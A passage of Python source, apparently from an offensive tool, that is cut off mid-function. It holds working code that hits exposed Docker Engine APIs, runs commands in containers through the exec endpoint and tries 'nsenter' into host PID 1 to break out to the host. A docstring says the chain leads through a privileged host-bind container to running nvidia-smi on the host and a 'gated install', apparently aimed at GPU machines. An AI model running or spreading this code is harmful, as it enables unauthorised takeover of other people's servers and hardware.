          # ------------------------------------------------------------------ remote exec helpers
          def nsenter_cmd(ipx, port, ctid, inner):
              """Run bash -lc inner via docker exec inside container ctid; try nsenter to host first."""
              base = 'http://%s:%d' % (ipx, port)
              q = shlex.quote(inner)
              for wrapper in ("nsenter -t 1 -m -u -i -n -p -- bash -lc " + q,
                              'bash -lc ' + q):
                  st, body, _ = http_req('POST', base + '/containers/%s/exec' % ctid,
                                         {'AttachStdout': True, 'AttachStderr': True, 'Cmd': ['bash', '-lc', wrapper]}, timeout=10)
                  try:
                      eid = json.loads(body).get('Id', '')
                  except Exception:
                      eid = ''
                  if not eid:
                      continue
                  st2, body2, _ = http_req('POST', base + '/exec/%s/start' % eid, {'Detach': False, 'Tty': False}, timeout=90)
                  txt = ''.join(ch for ch in body2 if ch == '\n' or ch == '\t' or 32 <= ord(ch) < 127)
                  if txt.strip():
                      return wrapper.startswith('nsenter'), txt
              return False, ''


          def docker_exec_convert(a, p, tag):
              """Untrusted Docker API -> privileged host-bind container -> host nvidia-smi + gated install."""
              st, body, _ = http_req('GET', 'http://%s:%d/version' % (a, p), timeout=5)
              print('I130MLS2_EXEC ip=%s port=%d kind=docker stage=version status=%s body=[%s]' % (a, p, st, one(body, 1)[:200]))
              if st != 200:
                  return
              imgs = []
              st, body, _ = http_req('GET', 'http://%s:%d/images/json' % (a, p), timeout=8)
              try:
                  for im in json.loads(body):
